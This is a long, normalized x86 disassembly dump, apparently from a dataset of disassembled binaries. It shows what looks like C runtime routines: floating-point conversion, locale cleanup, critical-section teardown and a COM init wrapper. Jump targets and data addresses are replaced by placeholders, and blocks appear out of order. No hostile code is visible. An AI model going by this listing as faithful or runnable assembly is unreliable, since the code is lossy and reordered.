test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x64 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
mov ebx [ ebp - 0x26 ]
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx ax
jae r-xdata
je r-xdata
mov eax rw-data
sub eax 0x60
neg ebx
mov [ ebp - 0x68 ] eax
test ebx ebx
xor edx edx
cmp [ ebp - 0x60 ] dx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_401400
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x68 ] 0x54
mov ecx ebx
sar ebx 0x3
and ecx 0x7
je r-xdata
cmp ecx eax
jne r-xdata
cmp ecx 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_40ca53
add esp 0xc
test eax eax
jne r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x60 ] ax
mov [ edx + 0x3 ] 0x3001
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x68 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_402acd
mov [ ebx + 0x3 ] 0x6
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jns r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0xa ]
mov edx ecx
xor edx [ ebp - 0x16 ]
mov esi 0x7fff
and edx 0x8000
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x16 ]
and edx esi
and ecx esi
lea esi [ ecx + edx ]
movzx edi si
mov esi 0x7fff
cmp dx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x58 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp cx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_40ca53
add esp 0xc
test eax eax
jne r-xdata
mov al [ ebx - 0x1 ]
sub ebx 0x2
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x54 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
add edi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x58 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x48 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp cx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x60 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jns r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x58 ] 0x2
add eax 0x2
dec [ ebp - 0x48 ]
cmp [ ebp - 0x48 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x54 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x58 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
add esi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x6c ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jns r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x70 ] 0x2
sub [ ebp - 0x6c ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x70 ]
movzx ecx [ eax ]
mov eax [ ebp - 0x6c ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x48 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x48 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x58 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x58 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_40e6d0
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_403b91
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_40e730
push ebp
mov ebp esp
push 0xffffffff
push sub_416490
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor edi edi
push 0x34
mov [ esi + 0xc ] edi
call sub_4066cf
add esp 0x4
cmp eax edi
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] edi
call sub_40140f
push r--data
lea ecx [ ebp - 0x2c ]
push ecx
mov [ ebp - 0x2c ] r--data
call sub_4037cf
int3
mov [ esi + 0x8 ] eax
mov [ eax ] eax
mov eax [ esi + 0x8 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x8 ]
mov [ eax + 0x8 ] eax
mov eax [ esi + 0x8 ]
mov bl 0x1
mov [ eax + 0x30 ] bl
mov ecx [ esi + 0x8 ]
mov [ ecx + 0x31 ] bl
mov [ ebp - 0x4 ] edi
push 0x18
mov [ esi + 0x1c ] edi
call sub_4066cf
add esp 0x4
cmp eax edi
je r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] edi
call sub_40140f
push r--data
lea edx [ ebp - 0x20 ]
push edx
mov [ ebp - 0x20 ] r--data
call sub_4037cf
mov [ esi + 0x18 ] eax
mov [ eax ] eax
mov eax [ esi + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x18 ]
mov [ eax + 0x8 ] eax
mov edx [ esi + 0x18 ]
mov [ edx + 0x14 ] bl
mov eax [ esi + 0x18 ]
mov [ eax + 0x15 ] bl
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
push edi
mov [ ebp - 0x4 ] 0x2
call [ CoInitialize@IAT ]
mov ecx [ ebp + 0xc ]
push esi
call sub_411bb0
call [ CoUninitialize@IAT ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40e844
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_40ffac
call sub_40ffac
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_40e8c0
push ebp
mov ebp esp
shr eax 0x1
mov ecx 0x0
je r-xdata
mov ecx 0x80070057
cmp eax 0x7fffffff
jbe r-xdata
mov eax ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push esi
push edi
lea esi [ eax - 0x1 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push esi
push ebx
xor edi edi
call sub_40783e
add esp 0x10
test eax eax
js r-xdata
test ecx ecx
js r-xdata
xor eax eax
mov [ ebx + esi * 2 ] ax
mov edi 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn
xor edx edx
mov eax edi
pop edi
mov [ ebx + esi * 2 ] dx
pop esi
pop ebp
retn
sub_40e920
push ebp
mov ebp esp
sub esp 0x10
mov eax [ eax + 0x4 ]
push ebx
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x31 ] 0x0
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x14 ]
push esi
mov esi [ edx + 0x10 ]
push edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x10 ] ecx
jmp r-xdata
cmp [ ebp - 0x10 ] 0x10
lea edi [ ebx + 0xc ]
jb r-xdata
mov eax [ edi + 0x10 ]
mov ecx eax
cmp ecx eax
jae r-xdata
mov edx [ edx ]
cmp eax esi
jae r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov esi eax
cmp esi 0x4
jb r-xdata
mov edi [ edi ]
test esi esi
je r-xdata
lea ecx [ ecx ]
xor ecx ecx
movzx ecx [ edi ]
movzx ebx [ edx ]
sub ecx ebx
jne r-xdata
sub esi 0x4
add edx 0x4
add edi 0x4
cmp esi 0x4
jae r-xdata
jns r-xdata
mov esi [ ebp - 0x8 ]
cmp eax esi
jb r-xdata
mov ebx [ ebp - 0x4 ]
sar ecx 0x1f
or ecx 0x1
jmp r-xdata
cmp esi 0x1
jbe r-xdata
mov ecx [ edi ]
cmp ecx [ edx ]
jne r-xdata
mov [ ebp - 0xc ] ebx
mov ebx [ ebx ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
cmp eax esi
setne cl
test ecx ecx
test ecx ecx
jne r-xdata
mov ebx [ ebp - 0x4 ]
movzx ecx [ edi + 0x1 ]
movzx ebx [ edx + 0x1 ]
sub ecx ebx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
pop edi
pop esi
cmp [ ebx + 0x31 ] 0x0
mov [ ebp - 0x4 ] ebx
je r-xdata
cmp esi 0x2
jbe r-xdata
movzx ecx [ edi + 0x2 ]
movzx ebx [ edx + 0x2 ]
sub ecx ebx
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx ecx [ edi + 0x3 ]
movzx edx [ edx + 0x3 ]
sub ecx edx
sub_40ea20
mov edi edi
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov esi [ esi + 0xc ]
test esi esi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
pop esi
retn
push esi
call [ LocalFree@IAT ]
sub_40ea50
mov ecx [ eax ]
mov eax [ edx ]
cmp ecx eax
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
xor ecx ecx
test eax eax
sete al
retn
test eax eax
jne r-xdata
test eax eax
je r-xdata
call sub_4033b0
xor ecx ecx
test eax eax
sete al
retn
mov ecx [ ecx ]
test ecx ecx
je r-xdata
mov eax [ eax ]
test eax eax
je r-xdata
push ecx
call [ SysStringLen@IAT ]
test eax eax
je r-xdata
push eax
call [ SysStringLen@IAT ]
test eax eax
je r-xdata
mov eax 0x1
xor ecx ecx
test eax eax
sete al
retn
or eax 0xffffffff
xor ecx ecx
test eax eax
sete al
retn
sub_40eab5
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_40140f
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_4037cf
int3
sub_40eb07
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_40ab76
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_40eb5e
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_40ebf7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_406d2b
and [ eax ] 0x0
call sub_40f84f
mov [ eax ] 0x9
call sub_406d2b
and [ eax ] 0x0
call sub_40f84f
mov [ eax ] 0x9
call sub_40c515
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_40ec70
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40ab76
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40ab76
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40ab76
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40ab76
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40ab76
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40ab76
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40ab76
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40ab76
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40ab76
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40ab76
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40ab76
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_40ab76
pop ecx
push esi
call sub_40ab76
pop ecx
sub_40ed6e
push 0xc
push r--data
call sub_413ff0
call sub_40c968
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_40723f
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ee09
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_414035
retn
push 0x20
call sub_4103d9
cmp esi rw-data
je r-xdata
push esi
call sub_40ab76
pop ecx
sub_40ee12
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_40723f
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_40ee62
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_407759
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
